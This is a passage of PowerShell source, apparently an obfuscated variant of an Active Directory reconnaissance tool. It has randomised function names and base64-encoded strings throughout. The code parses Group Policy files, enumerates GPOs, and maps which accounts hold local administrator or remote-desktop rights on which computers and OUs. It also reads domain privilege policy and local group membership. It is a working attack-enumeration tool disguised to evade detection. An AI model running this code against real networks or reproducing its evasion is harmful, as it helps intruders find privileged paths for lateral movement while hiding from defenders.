                            $PropertyValues = $PropertyValues.split(',')
                        }
                        if(!$SectionsTemp[$SectionName]) {
                            $SectionsTemp.Add($SectionName, @{})
                        }
                        $SectionsTemp[$SectionName].Add( $PropertyName, $PropertyValues )
                    }
                }
                ForEach ($Section in $SectionsTemp.keys) {
                    $SectionsFinal[$Section] = New-Object PSObject -Property $SectionsTemp[$Section]
                }
                New-Object PSObject -Property $SectionsFinal
            }
        }
        catch {
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcABhAHIAcwBpAG4AZwAgACQARwBwAHQAVABtAHAAbABQAGEAdABoACAAOgAgACQAXwA=')))
        }
    }
    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAdABlAG0AcAAgAFAAUwBEAHIAaQB2AGUAIAAkAFIAYQBuAGQARAByAGkAdgBlAA==')))
            gdr -Name $RandDrive -ErrorAction SilentlyContinue | rdr
        }
    }
}
function EmptiveMyxossantRegus {
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [String]
        $GroupsXMLPath,
        [Switch]
        $ResolveSids,
        [Switch]
        $UsePSDrive
    )
    begin {
        if($UsePSDrive) {
            $Parts = $GroupsXMLPath.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]
            $RandDrive = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AA=='))).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQARwByAG8AdQBwAHMAWABNAEwAUABhAHQAaAAgAHUAcwBpAG4AZwAgAGEAIAB0AGUAbQBwACAAUABTAEQAcgBpAHYAZQAgAGEAdAAgACQAUgBhAG4AZABEAHIAaQB2AGUA')))
            try {
                $Null = ndr -Name $RandDrive -PSProvider FileSystem -Root $FolderPath  -ErrorAction Stop
            }
            catch {
                Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAbQBvAHUAbgB0AGkAbgBnACAAcABhAHQAaAAgACQARwByAG8AdQBwAHMAWABNAEwAUABhAHQAaAAgADoAIAAkAF8A')))
                return $Null
            }
            $GroupsXMLPath = $RandDrive + ":\" + $FilePath
        } 
    }
    process {
        if(Test-Path $GroupsXMLPath) {
            [xml] $GroupsXMLcontent = gc $GroupsXMLPath
            $GroupsXMLcontent | Select-Xml $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwAvAEcAcgBvAHUAcAA='))) | select -ExpandProperty node | % {
                $Members = @()
                $MemberOf = @()
                $LocalSid = $_.Properties.GroupSid
                if(!$LocalSid) {
                    if($_.Properties.groupName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                        $LocalSid = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                    }
                    elseif($_.Properties.groupName -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                        $LocalSid = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                    }
                    else {
                        $LocalSid = $_.Properties.groupName
                    }
                }
                $MemberOf = @($LocalSid)
                $_.Properties.members | % {
                    $_ | select -ExpandProperty Member | ? { $_.action -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBEAEQA'))) } | % {
                        if($_.sid) {
                            $Members += $_.sid
                        }
                        else {
                            $Members += $_.name
                        }
                    }
                }
                if ($Members -or $Memberof) {
                    $Filters = $_.filters | % {
                        $_ | select -ExpandProperty Filter* | % {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    if($ResolveSids) {
                        $Memberof = $Memberof | % {ElminutColatCably $_}
                        $Members = $Members | % {ElminutColatCably $_}
                    }
                    if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}
                    if($Members -isnot [system.array]) {$Members = @($Members)}
                    $GPOProperties = @{
                        'GPODisplayName' = $GPODisplayName
                        'GPOName' = $GPOName
                        'GPOPath' = $GroupsXMLPath
                        'Filters' = $Filters
                        'MemberOf' = $Memberof
                        'Members' = $Members
                    }
                    New-Object -TypeName PSObject -Property $GPOProperties
                }
            }
        }
    }
    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB2AGkAbgBnACAAdABlAG0AcAAgAFAAUwBEAHIAaQB2AGUAIAAkAFIAYQBuAGQARAByAGkAdgBlAA==')))
            gdr -Name $RandDrive -ErrorAction SilentlyContinue | rdr
        }
    }
}
function GapTardGeck {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $GPOname = '*',
        [String]
        $DisplayName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    begin {
        $GPOSearcher = SuprajesUnderAganger -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize
    }
    process {
        if ($GPOSearcher) {
            if($DisplayName) {
                $GPOSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAEQAaQBzAHAAbABhAHkATgBhAG0AZQApACkA')))
            }
            else {
                $GPOSearcher.filter=$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAKABuAGEAbQBlAD0AJABHAFAATwBuAGEAbQBlACkAKQA=')))
            }
            $GPOSearcher.FindAll() | ? {$_} | % {
                HaleCiteOzoos -Properties $_.Properties
            }
        }
    }
}
function CrewsFutingUns {
    [CmdletBinding()]
    Param (
        [String]
        $GPOname = '*',
        [String]
        $DisplayName,
        [Switch]
        $ResolveSids,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $ADSpath,
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    GapTardGeck -GPOName $GPOname -DisplayName $GPOname -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize | Foreach-Object {
        $Memberof = $Null
        $Members = $Null
        $GPOdisplayName = $_.displayname
        $GPOname = $_.name
        $GPOPath = $_.gpcfilesyspath
        $ParseArgs =  @{
            'GptTmplPath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABHAFAATwBQAGEAdABoAFwATQBBAEMASABJAE4ARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAFMAZQBjAEUAZABpAHQAXABHAHAAdABUAG0AcABsAC4AaQBuAGYA')))
            'UsePSDrive' = $UsePSDrive
        }
        $Inf = AnthEggaptesPleaf @ParseArgs
        if($Inf.GroupMembership) {
            $Memberof = $Inf.GroupMembership | gm *Memberof | % { $Inf.GroupMembership.($_.name) } | % { $_.trim('*') }
            $Members = $Inf.GroupMembership | gm *Members | % { $Inf.GroupMembership.($_.name) } | % { $_.trim('*') }
            if ($Members -or $Memberof) {
                if(!$Memberof) {
                    $Memberof = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                }
                if($ResolveSids) {
                    $Memberof = $Memberof | % {ElminutColatCably $_}
                    $Members = $Members | % {ElminutColatCably $_}
                }
                if($Memberof -isnot [system.array]) {$Memberof = @($Memberof)}
                if($Members -isnot [system.array]) {$Members = @($Members)}
                $GPOProperties = @{
                    'GPODisplayName' = $GPODisplayName
                    'GPOName' = $GPOName
                    'GPOPath' = $GPOPath
                    'Filters' = $Null
                    'MemberOf' = $Memberof
                    'Members' = $Members
                }
                New-Object -TypeName PSObject -Property $GPOProperties
            }
        }
        $ParseArgs =  @{
            'GroupsXMLpath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABHAFAATwBQAGEAdABoAFwATQBBAEMASABJAE4ARQBcAFAAcgBlAGYAZQByAGUAbgBjAGUAcwBcAEcAcgBvAHUAcABzAFwARwByAG8AdQBwAHMALgB4AG0AbAA=')))
            'ResolveSids' = $ResolveSids
            'UsePSDrive' = $UsePSDrive
        }
        EmptiveMyxossantRegus @ParseArgs
    }
}
function EpilyIscJoyal {
    [CmdletBinding()]
    Param (
        [String]
        $UserName,
        [String]
        $GroupName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [String]
        $LocalGroup = 'Administrators',
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    if($UserName) {
        $User = BilinessArcallyBorn -UserName $UserName -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        $UserSid = $User.objectsid
        if(!$UserSid) {    
            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgAgACcAJABVAHMAZQByAE4AYQBtAGUAJwAgAG4AbwB0ACAAZgBvAHUAbgBkACEA')))
        }
        $TargetSid = $UserSid
        $ObjectSamAccountName = $User.samaccountname
        $ObjectDistName = $User.distinguishedname
    }
    elseif($GroupName) {
        $Group = SolematePallyCommixed -GroupName $GroupName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
        $GroupSid = $Group.objectsid
        if(!$GroupSid) {    
            Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAAJwAkAEcAcgBvAHUAcABOAGEAbQBlACcAIABuAG8AdAAgAGYAbwB1AG4AZAAhAA==')))
        }
        $TargetSid = $GroupSid
        $ObjectSamAccountName = $Group.samaccountname
        $ObjectDistName = $Group.distinguishedname
    }
    else {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBVAHMAZQByAE4AYQBtAGUAIABvAHIAIAAtAEcAcgBvAHUAcABOAGEAbQBlACAAbQB1AHMAdAAgAGIAZQAgAHMAcABlAGMAaQBmAGkAZQBkACEA')))
    }
    if($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBAGQAbQBpAG4AKgA=')))) {
        $LocalSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
    }
    elseif ( ($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBSAEQAUAAqAA==')))) -or ($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBSAGUAbQBvAHQAZQAqAA==')))) ) {
        $LocalSID = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
    }
    elseif ($LocalGroup -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1ACoA')))) {
        $LocalSID = $LocalGroup
    }
    else {
        throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEcAcgBvAHUAcAAgAG0AdQBzAHQAIABiAGUAIAAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAnACwAIAAnAFIARABQACcALAAgAG8AcgAgAGEAIAAnAFMALQAxAC0ANQAtAFgAJwAgAHQAeQBwAGUAIABzAGkAZAAuAA==')))
    }
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAFMAaQBkADoAIAAkAEwAbwBjAGEAbABTAEkARAA=')))
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBpAGQAOgAgACQAVABhAHIAZwBlAHQAUwBpAGQA')))
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATwBiAGoAZQBjAHQARABpAHMAdABOAGEAbQBlADoAIAAkAE8AYgBqAGUAYwB0AEQAaQBzAHQATgBhAG0AZQA=')))
    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }
    $TargetSid += SolematePallyCommixed -Domain $Domain -DomainController $DomainController -PageSize $PageSize -UserName $ObjectSamAccountName -RawSids
    if($TargetSid -isnot [system.array]) { $TargetSid = @($TargetSid) }
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBmAGYAZQBjAHQAaQB2AGUAIAB0AGEAcgBnAGUAdAAgAHMAaQBkAHMAOgAgACQAVABhAHIAZwBlAHQAUwBpAGQA')))
    $GPOGroupArgs =  @{
        'Domain' = $Domain
        'DomainController' = $DomainController
        'UsePSDrive' = $UsePSDrive
        'PageSize' = $PageSize
    }
    $GPOgroups = CrewsFutingUns @GPOGroupArgs | % {
        if ($_.members) {
            $_.members = $_.members | ? {$_} | % {
                if($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))) {
                    $_
                }
                else {
                    AutUnalPopular -ObjectName $_ -Domain $Domain
                }
            }
            if($_.members -isnot [system.array]) { $_.members = @($_.members) }
            if($_.memberof -isnot [system.array]) { $_.memberof = @($_.memberof) }
            if($_.members) {
                try {
                    if( (diff -ReferenceObject $_.members -DifferenceObject $TargetSid -IncludeEqual -ExcludeDifferent) ) {
                        if ($_.memberof -contains $LocalSid) {
                            $_
                        }
                    }
                } 
                catch {
                    Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAYwBvAG0AcABhAHIAaQBuAGcAIABtAGUAbQBiAGUAcgBzACAAYQBuAGQAIAAkAFQAYQByAGcAZQB0AFMAaQBkACAAOgAgACQAXwA=')))
                }
            }
        }
    }
    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AZwByAG8AdQBwAHMAOgAgACQARwBQAE8AZwByAG8AdQBwAHMA')))
    $ProcessedGUIDs = @{}
    $GPOgroups | ? {$_} | % {
        $GPOguid = $_.GPOName
        if( -not $ProcessedGUIDs[$GPOguid] ) {
            $GPOname = $_.GPODisplayName
            $Filters = $_.Filters
            OrchaniseCripterCilous -Domain $Domain -DomainController $DomainController -GUID $GPOguid -FullData -PageSize $PageSize | % {
                if($Filters) {
                    $OUComputers = GrochoniIncunnerMoustic -ADSpath $_.ADSpath -FullData -PageSize $PageSize | ? {
                        $_.adspath -match ($Filters.Value)
                    } | % { $_.dnshostname }
                }
                else {
                    $OUComputers = GrochoniIncunnerMoustic -ADSpath $_.ADSpath -PageSize $PageSize
                }
                $GPOLocation = New-Object PSObject
                $GPOLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $ObjectDistName
                $GPOLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AbgBhAG0AZQA='))) $GPOname
                $GPOLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AZwB1AGkAZAA='))) $GPOguid
                $GPOLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABhAGkAbgBlAHIATgBhAG0AZQA='))) $_.distinguishedname
                $GPOLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAHMA'))) $OUComputers
                $GPOLocation
            }
            $ProcessedGUIDs[$GPOguid] = $True
        }
    }
}
function PiraticAbsentfulOceredite {
    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,
        [String]
        $OUName,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $Recurse,
        [String]
        $LocalGroup = 'Administrators',
        [Switch]
        $UsePSDrive,
        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )
    process {
        if(!$ComputerName -and !$OUName) {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAG8AcgAgAC0ATwBVAE4AYQBtAGUAIABtAHUAcwB0ACAAYgBlACAAcAByAG8AdgBpAGQAZQBkAA==')))
        }
        if($ComputerName) {
            $Computers = GrochoniIncunnerMoustic -ComputerName $ComputerName -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize
            if(!$Computers) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByACAAJABDAG8AbQBwAHUAdABlAHIAIABpAG4AIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnACAAbgBvAHQAIABmAG8AdQBuAGQAIQA=')))
            }
            ForEach($Computer in $Computers) {
                $DN = $Computer.distinguishedname
                $TargetOUs = $DN.split(",") | Foreach-Object {
                    if($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBVAD0A'))))) {
                        $DN.substring($DN.indexof($_))
                    }
                }
            }
        }
        else {
            $TargetOUs = @($OUName)
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAIABPAFUAcwA6ACAAJABUAGEAcgBnAGUAdABPAFUAcwA=')))
        $TargetOUs | ? {$_} | Foreach-Object {
            $OU = $_
            $GPOgroups = OrchaniseCripterCilous -Domain $Domain -DomainController $DomainController -ADSpath $_ -FullData -PageSize $PageSize | Foreach-Object { 
                $_.gplink.split("][") | Foreach-Object {
                    if ($_.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA='))))) {
                        $_.split(";")[0]
                    }
                }
            } | Foreach-Object {
                $GPOGroupArgs =  @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $_
                    'UsePSDrive' = $UsePSDrive
                    'PageSize' = $PageSize
                }
                CrewsFutingUns @GPOGroupArgs
            }
            $GPOgroups | ? {$_} | Foreach-Object {
                $GPO = $_
                $GPO.members | Foreach-Object {
                    $Object = LatedCoidsuckRogues -Domain $Domain -DomainController $DomainController $_ -PageSize $PageSize
                    $GPOComputerAdmin = New-Object PSObject
                    $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                    $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU
                    $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPO.GPODisplayName
                    $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $GPO.GPOPath
                    $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $Object.name
                    $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname
                    $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_
                    $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $($Object.samaccounttype -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA'))))
                    $GPOComputerAdmin 
                    if($Recurse -and $GPOComputerAdmin.isGroup) {
                        EspeiPersBathly -SID $_ -FullData -Recurse -PageSize $PageSize | Foreach-Object {
                            $MemberDN = $_.distinguishedName
                            $MemberDomain = $MemberDN.subString($MemberDN.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            if ($_.samAccountType -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA')))) {
                                $MemberIsGroup = $True
                            }
                            else {
                                $MemberIsGroup = $False
                            }
                            if ($_.samAccountName) {
                                $MemberName = $_.samAccountName
                            }
                            else {
                                try {
                                    $MemberName = ElminutColatCably $_.cn
                                }
                                catch {
                                    $MemberName = $_.cn
                                }
                            }
                            $GPOComputerAdmin = New-Object PSObject
                            $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ComputerName
                            $GPOComputerAdmin | Add-Member Noteproperty 'OU' $OU
                            $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) $GPO.GPODisplayName
                            $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) $GPO.GPOPath
                            $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQATgBhAG0AZQA='))) $MemberName
                            $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $MemberDN
                            $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $_.objectsid
                            $GPOComputerAdmin | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEcAcgBvAHUAcAA='))) $MemberIsGroup
                            $GPOComputerAdmin 
                        }
                    }
                }
            }
        }
    }
}
function SticQuophysisOoldness {
    [CmdletBinding()]
    Param (
        [String]
        [ValidateSet("Domain","DC")]
        $Source ="Domain",
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ResolveSids,
        [Switch]
        $UsePSDrive
    )
    if($Source -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))) {
        $GPO = GapTardGeck -Domain $Domain -DomainController $DomainController -GPOname $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAzADEAQgAyAEYAMwA0ADAALQAwADEANgBEAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        if($GPO) {
            $GptTmplPath = $GPO.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }
            AnthEggaptesPleaf @ParseArgs
        }
    }
    elseif($Source -eq "DC") {
        $GPO = GapTardGeck -Domain $Domain -DomainController $DomainController -GPOname $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewA2AEEAQwAxADcAOAA2AEMALQAwADEANgBGAC0AMQAxAEQAMgAtADkANAA1AEYALQAwADAAQwAwADQARgBCADkAOAA0AEYAOQB9AA==')))
        if($GPO) {
            $GptTmplPath = $GPO.gpcfilesyspath + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAEEAQwBIAEkATgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzACAATgBUAFwAUwBlAGMARQBkAGkAdABcAEcAcAB0AFQAbQBwAGwALgBpAG4AZgA=')))
            $ParseArgs =  @{
                'GptTmplPath' = $GptTmplPath
                'UsePSDrive' = $UsePSDrive
            }
            AnthEggaptesPleaf @ParseArgs | Foreach-Object {
                if($ResolveSids) {
                    $Policy = New-Object PSObject
                    $_.psobject.properties | Foreach-Object {
                        if( $_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAUgBpAGcAaAB0AHMA')))) {
                            $PrivilegeRights = New-Object PSObject
                            $_.Value.psobject.properties | Foreach-Object {
                                $Sids = $_.Value | Foreach-Object {
                                    try {
                                        if($_ -isnot [System.Array]) { 
                                            ElminutColatCably $_ 
                                        }
                                        else {
                                            $_ | Foreach-Object { ElminutColatCably $_ }
                                        }
                                    }
                                    catch {
                                        Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAcgBlAHMAbwBsAHYAaQBuAGcAIABTAEkARAAgADoAIAAkAF8A')))
                                    }
                                }
                                $PrivilegeRights | Add-Member Noteproperty $_.Name $Sids
                            }
                            $Policy | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAUgBpAGcAaAB0AHMA'))) $PrivilegeRights
                        }
                        else {
                            $Policy | Add-Member Noteproperty $_.Name $_.Value
                        }
                    }
                    $Policy
                }
                else { $_ }
            }
        }
    }
}
function CuswapiCalCharizes {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $GroupName = 'Administrators',
        [Switch]
        $ListGroups,
        [Switch]
        $Recurse
    )
    begin {
        if ((-not $ListGroups) -and (-not $GroupName)) {
            $ObjSID = New-Object System.Security.Principal.SecurityIdentifier($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA'))))
            $Objgroup = $ObjSID.Translate( [System.Security.Principal.NTAccount])
            $GroupName = ($Objgroup.Value).Split('\')[1]
        }
    }
    process {
        $Servers = @()
        if($ComputerFile) {
            $Servers = gc -Path $ComputerFile
        }
        else {
            $Servers += InfeerismAltersDitronite -Object $ComputerName
        }
        ForEach($Server in $Servers) {
            try {
                if($ListGroups) {
                    $Computer = [ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAUwBlAHIAdgBlAHIALABjAG8AbQBwAHUAdABlAHIA')))
                    $Computer.psbase.children | ? { $_.psbase.schemaClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAA=='))) } | % {
                        $Group = New-Object PSObject
                        $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA'))) $Server
                        $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))) ($_.name[0])
                        $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBJAEQA'))) ((New-Object System.Security.Principal.SecurityIdentifier $_.objectsid[0],0).Value)
                        $Group | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))) ($_.Description[0])
                        $Group
                    }
                }
                else {
                    $Members = @($([ADSI]$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4ATgBUADoALwAvACQAUwBlAHIAdgBlAHIALwAkAEcAcgBvAHUAcABOAGEAbQBlAA==')))).psbase.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIAcwA=')))))
                    $Members | % {
